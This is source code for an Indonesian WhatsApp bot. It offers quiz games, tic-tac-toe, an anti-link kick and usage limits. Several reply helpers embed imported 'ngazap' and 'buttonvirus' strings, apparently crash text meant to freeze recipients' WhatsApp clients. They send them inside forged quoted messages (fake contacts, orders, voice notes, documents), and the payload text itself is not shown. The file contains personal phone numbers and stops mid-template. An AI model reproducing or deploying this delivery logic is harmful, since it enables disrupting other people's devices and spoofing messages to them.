/**
   * Create By Fax Faraxx.
   * Contact Me on wa.me/6281523940672
   * Follow https://github.com/FaxBotz
*/

process.on('uncaughtException', console.error) //Safe Log Error
require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
var Jimp = require('jimp')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const { color, bgcolor } = require('./lib/color')
const textpro = require('./lib/textpro')


const { buttonvirus } = require('./faraxx/buttonvirus')
const { ngazap } = require('./faraxx/ngazap')
const { faxbot } = require('./faraxx/faxbot')


const { TiktokDownloader } = require('./lib/tiktokdl') 
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const wita = moment.tz('Asia/Makassar').format("HH:mm:ss")
const wit = moment.tz('Asia/Jayapura').format("HH:mm:ss")
var d = new Date(new Date + 3600000)
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = hisoka = async (hisoka, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await hisoka.decodeJid(hisoka.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
     	const from = mek.key.remoteJid
        // Group
        const groupMetadata = m.isGroup ? await hisoka.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
	
	        //resize
        const reSize = async(buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = db.data.users[m.sender]
            if (typeof user !== 'object') db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = db.data.chats[m.chat]
            if (typeof chats !== 'object') db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
	    if (!('anticall' in setting)) setting.anticall = true
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
		if (!('templateLocation' in setting)) setting.templateLocation = false
	    } else global.db.data.settings[botNumber] = {
	    anticall: true,
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
		templateLocation: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!hisoka.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
        if (m.message) {
            hisoka.readMessages([m.key])
            //console bukan kontol
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(budy || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }
	//function Reply Fardan
//=================================================//
// Fake Next Projext
 const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`© ${ownername}`, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `© ${ownername}`, 'jpegThumbnail': thumb}}}
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
//=================================================//
  // Random Image Simple Menu
let picaks = ['flaming','fluming','flarun,flasmurf']
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
// Reply Kalau Mau Pake Tinggal Ubah aja freply Ke freply = replace aja semua 
/*const freply = (teks) => {
hisoka.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": thumb,"sourceUrl": `${myweb}`}}}, { quoted: m })
}   */
//Target
const repply = (teks) => {
return hisoka.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC Fardan`,"body": ` kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": thumb,"sourceUrl": `https://youtube.com/c/FaxFarax354`}}}, { quoted: m })
} 
//=================================================//
// Kontak
 const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
const bacito = (jid, text, quoted = fkontak) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//GCLINK
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `© ${ownername}`, 'jpegThumbnail': thumb}}}
const bacit = (jid, text, quoted = fgclink) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Fardan ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
const anjay = (teks) => {
 hisoka.sendMessage(m.chat, { image: thumb, caption: teks, contextInfo:{"externalAdReply": {"title": `SC Fardan`,"body": `kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/FaxFarax354`,
thumbnailUrl: 'https://telegra.ph/file/c587facf75ba516675799.jpg', 
thumbnail: thumb,
}
}}, { quoted:doc})
}
//=================================================//
// VN 
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const thejo = (jid, text, quoted = fvn) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//Lokasi
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumb}}}
const thejobot = (jid, text, quoted = floc) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//Troli
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumb, surface: 200, message: `© ${ownername}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const review = (jid, text, quoted = ftroli) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//image
const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
const reply = (jid, text, quoted = ctlg) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./faraxx/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
const freply = (teks) => {
hisoka.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply":{"title": `By ${pushname}`,"showAdAttribution": true,"body": `ī.am/𝙵𝚊𝚛𝚍𝚊𝚗ꪶ͢𝚍𝚎𝚟ꫂ⁩`,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/8aaadb4fd36f17f36fc7f.jpg`,"thumbnail": thumb,"sourceUrl": `https://wa.me/6281523940672?text=Lorddd`}}}, { quoted: m})
        }
//=================================================//
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await hisoka.updateProfileStatus(`${hisoka.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        freply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return freply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await hisoka.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return freply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return freply(`Ehh maaf kamu admin`)
        if (isCreator) return freply(`Ehh maaf kamu owner bot ku`)
        hisoka.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: hisoka.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, hisoka.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        hisoka.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            hisoka.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await freply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else freply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // freply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    freply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
